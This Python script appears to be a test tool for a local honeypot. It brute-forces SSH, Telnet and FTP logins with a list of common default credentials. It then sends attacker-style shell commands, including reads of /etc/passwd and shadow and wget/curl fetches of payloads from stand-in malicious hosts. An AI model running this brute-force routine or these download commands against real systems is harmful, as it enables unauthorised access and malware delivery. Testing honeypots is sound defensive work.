"""
simulate_attack.py - Attack Simulator for Honeypot Testing

Simulates brute-force login attempts and shell commands across:
  - Port 2222 (SSH Honeypot)
  - Port 23   (Telnet Honeypot)
  - Port 21   (FTP Honeypot)

Usage:
    python simulate_attack.py
    python simulate_attack.py --target 192.168.1.100  # attack a remote host
"""

import socket
import time
import argparse
import threading

# ============ CONFIG ============
TARGET_HOST = "127.0.0.1"
DELAY = 0.5  # seconds between commands to mimic realistic attacker timing

# Common credential pairs to brute-force
CREDENTIALS = [
    ("admin",    "admin"),
    ("root",     "password"),
    ("root",     "123456"),
    ("admin",    "1234"),
    ("user",     "user"),
    ("guest",    "guest"),
    ("ubuntu",   "ubuntu"),
    ("pi",       "raspberry"),
]

# Shell commands an attacker would typically run
SHELL_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "pwd",
    "ls",
    "cat /etc/passwd",
    "cat /root/secret.txt",
    "cd /etc",
    "ls",
    "cat shadow",
    "cd /tmp",
    "wget http://malware.example.com/shell.sh",
    "curl http://evil.example.com/payload -o /tmp/p",
    "history",
    "ifconfig",
    "exit",
]

def recv_until(sock, marker=b":", timeout=3):
    """Receive data until a marker byte is found or timeout."""
    sock.settimeout(timeout)
    data = b""
    try:
        while marker not in data:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def recv_prompt(sock, timeout=2):
    """Receive until we get a shell prompt ending in # or $ ."""
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if data.strip().endswith(b"#") or data.strip().endswith(b"$") or data.strip().endswith(b": "):
                break
    except socket.timeout:
        pass
    return data

def send_line(sock, line):
    """Send a line followed by a newline."""
    sock.sendall((line + "\n").encode())
    time.sleep(DELAY)

def simulate_ssh(host, user, pwd):
    """Simulate an SSH brute-force + shell session."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, 2223))

        banner = recv_until(sock, b"login:", timeout=3)
        print(f"    [SSH] Banner: {banner.decode(errors='ignore').strip()[:60]}")

        send_line(sock, user)
        recv_until(sock, b"Password:", timeout=3)

        send_line(sock, pwd)
        time.sleep(0.3)

        # Receive the post-login message and first prompt
        recv_prompt(sock, timeout=2)

        print(f"    [SSH] Logged in as {user}/{pwd} — running shell commands...")
        for cmd in SHELL_COMMANDS:
            print(f"    [SSH] > {cmd}")
            send_line(sock, cmd)
            out = recv_prompt(sock, timeout=2)
            response = out.decode(errors="ignore").strip()
            if response:
                print(f"           {response[:80]}")

        sock.close()
    except Exception as e:
        print(f"    [SSH] Error: {e}")

def simulate_telnet(host, user, pwd):
    """Simulate a Telnet brute-force + shell session."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, 2323))

        # Skip Telnet IAC negotiation bytes and get login prompt
        banner = recv_until(sock, b"login:", timeout=3)
        print(f"    [TELNET] Banner: {banner.decode(errors='ignore').strip()[-60:]}")

        send_line(sock, user)
        recv_until(sock, b"Password:", timeout=3)

        send_line(sock, pwd)
        time.sleep(0.3)
        recv_prompt(sock, timeout=2)

        print(f"    [TELNET] Logged in as {user}/{pwd} — running shell commands...")
        for cmd in SHELL_COMMANDS:
            print(f"    [TELNET] > {cmd}")
            send_line(sock, cmd)
            out = recv_prompt(sock, timeout=2)
            response = out.decode(errors="ignore").strip()
            if response:
                print(f"             {response[:80]}")

        sock.close()
    except Exception as e:
        print(f"    [TELNET] Error: {e}")

def simulate_ftp(host, user, pwd):
    """Simulate an FTP credential brute-force attempt."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, 2121))

        banner = recv_until(sock, b"\n", timeout=3)
        print(f"    [FTP] Banner: {banner.decode(errors='ignore').strip()}")

        send_line(sock, f"USER {user}")
        resp = recv_until(sock, b"\n", timeout=3)
        print(f"    [FTP] < {resp.decode(errors='ignore').strip()}")

        send_line(sock, f"PASS {pwd}")
        resp = recv_until(sock, b"\n", timeout=3)
        print(f"    [FTP] < {resp.decode(errors='ignore').strip()}")

        sock.close()
    except Exception as e:
        print(f"    [FTP] Error: {e}")

def run_attack_wave(host, attack_num, user, pwd):
    """Run one wave of coordinated attacks across all three services."""
    print(f"\n{'='*60}")
    print(f"  ATTACK #{attack_num}: {user} / {pwd}")
    print(f"{'='*60}")

    print("\n  → SSH Attack (Port 2223)")
    simulate_ssh(host, user, pwd)
    time.sleep(0.3)

    print("\n  → Telnet Attack (Port 2323)")
    simulate_telnet(host, user, pwd)
    time.sleep(0.3)

    print("\n  → FTP Attack (Port 2121)")
    simulate_ftp(host, user, pwd)
    time.sleep(0.3)

def main():
    global DELAY
    parser = argparse.ArgumentParser(description="Honeypot Attack Simulator")
    parser.add_argument("--target", default=TARGET_HOST, help="Target host IP (default: 127.0.0.1)")
    parser.add_argument("--delay", type=float, default=DELAY, help="Delay between commands in seconds (default: 0.5)")
    args = parser.parse_args()

    host = args.target
    DELAY = args.delay

    print("=" * 60)
    print("   HONEYPOT ATTACK SIMULATOR")
    print(f"   Target: {host}")
    print(f"   Services: SSH:2223 | Telnet:2323 | FTP:2121")
    print(f"   Credential pairs: {len(CREDENTIALS)}")
    print("=" * 60)
    print("\n[!] Starting simulated attack campaign...\n")

    for i, (user, pwd) in enumerate(CREDENTIALS, start=1):
        run_attack_wave(host, i, user, pwd)
        time.sleep(1)  # Pause between attack waves

    print("\n" + "=" * 60)
    print("  SIMULATION COMPLETE")
    print("  Check the dashboard at http://127.0.0.1:5000")
    print("  or review honeypot.log and incident_report.txt")
    print("=" * 60)

if __name__ == "__main__":
    main()
